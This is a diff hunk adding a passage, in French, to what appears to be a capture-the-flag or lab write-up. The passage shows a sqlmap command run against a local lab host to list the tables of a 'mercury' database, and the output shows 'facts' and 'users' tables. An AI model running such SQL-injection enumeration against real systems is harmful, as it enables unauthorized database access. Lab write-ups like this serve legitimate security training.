@@ -248,3 +248,13 @@ available databases [2]:
 [*] mercury
 ```
 
+La commande ```sqlmap http://192.168.56.103:8080/mercuryfacts/1 -D mercury --tables``` me donne :
+```
+Database: mercury
+[2 tables]
++-------+
+| facts |
+| users |
++-------+
+```
+
